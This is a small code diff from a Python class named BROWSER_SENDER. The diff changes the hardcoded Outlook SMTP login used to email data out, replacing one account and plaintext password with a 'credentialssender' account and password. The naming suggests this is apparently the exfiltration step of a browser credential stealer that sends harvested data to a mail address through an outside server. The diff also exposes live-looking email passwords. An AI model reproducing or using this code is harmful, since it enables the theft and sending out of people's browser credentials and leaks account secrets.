@@ -270,9 +270,9 @@ class BROWSER_SENDER():
     def SEND(self):
         s = smtplib.SMTP('smtp.office365.com', 587)
         s.starttls()
-        s.login('shababbazzal66@outlook.com', 'Shababbz12')
+        s.login('credentialssender@outlook.com', 'Credssender@123')
         msg = EmailMessage()
-        msg["From"] = 'shababbazzal66@outlook.com'
+        msg["From"] = 'credentialssender@outlook.com'
         msg["Subject"] = self.subject
         msg["To"] = self.email
         msg.set_content(" ")
